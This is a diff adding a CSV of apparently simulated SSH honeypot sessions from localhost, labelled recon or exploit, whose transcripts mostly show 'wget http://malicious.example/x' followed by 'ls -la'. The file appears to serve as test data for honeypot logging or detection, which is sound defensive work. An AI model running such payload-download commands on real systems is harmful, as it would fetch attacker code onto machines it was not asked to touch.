@@ -1,0 +1,40 @@
+session_id,src_ip,src_port,timestamp,dst_port,attack_type,success,bytes_in,bytes_out,username,password,transcript
+S-1762444442,127.0.0.1,50923,2025-11-06 21:24:02,2222,recon,0,0,0,,,"uname -a
+"
+S-1762444589,127.0.0.1,52051,2025-11-06 21:26:29,2222,recon,0,0,0,,,"uname -a
+"
+S-1762450397,127.0.0.1,64216,2025-11-06 23:03:17,2222,exploit,0,0,0,,,"wget http://malicious.example/x
+
+ls -la
+"
+S-1762454985,127.0.0.1,57182,2025-11-07 00:19:45,2222,exploit,0,0,0,,,"wget http://malicious.example/x
+
+ATTACKER_CMD: ls -la"
+S-1762455958,127.0.0.1,53734,2025-11-07 00:35:58,2222,exploit,0,0,0,,,"wget http://malicious.example/x
+
+ATTACKER_CMD: ls -la"
+S-1762502340,127.0.0.1,50692,2025-11-07 13:29:00,2222,exploit,0,0,0,,,"wget http://malicious.example/x
+
+ATTACKER_CMD: ls -la"
+S-1762503072,127.0.0.1,59319,2025-11-07 13:41:12,2222,exploit,0,0,0,,,"wget http://malicious.example/x
+"
+S-1762503846,127.0.0.1,58022,2025-11-07 13:54:06,2222,exploit,0,0,0,,,"wget http://malicious.example/x
+
+ATTACKER_CMD: ls -la"
+S-1762504483,127.0.0.1,54140,2025-11-07 14:04:43,2222,exploit,0,0,0,,,"wget http://malicious.example/x
+
+ATTACKER_CMD: ls -la"
+S-1762597591,127.0.0.1,60336,2025-11-08 15:56:31,2222,exploit,1,0,0,,,"wget http://malicious.example/x
+ATTACKER_CMD: ls -la"
+S-1762602185,127.0.0.1,60502,2025-11-08 17:13:05,2222,exploit,1,0,0,,,"wget http://malicious.example/x
+ATTACKER_CMD: ls -la"
+S-1762626543,127.0.0.1,51498,2025-11-08 23:59:03,2222,exploit,1,0,0,,,"wget http://malicious.example/x
+ATTACKER_CMD: ls -la"
+S-1762627149,127.0.0.1,50178,2025-11-09 00:09:09,2222,exploit,1,0,0,,,"wget http://malicious.example/x
+ATTACKER_CMD: ls -la"
+S-1762776952,127.0.0.1,61024,2025-11-10 17:45:52,2222,recon,1,0,0,,,"wget http://malicious.example/x
+ATTACKER_CMD: ls -la"
+S-1762797098,127.0.0.1,57713,2025-11-10 23:21:38,2222,recon,1,0,0,,,"wget http://malicious.example/x
+ATTACKER_CMD: ls -la"
+S-1762797430,127.0.0.1,55184,2025-11-10 23:27:10,2222,recon,1,0,0,,,"wget http://malicious.example/x
+ATTACKER_CMD: ls -la"
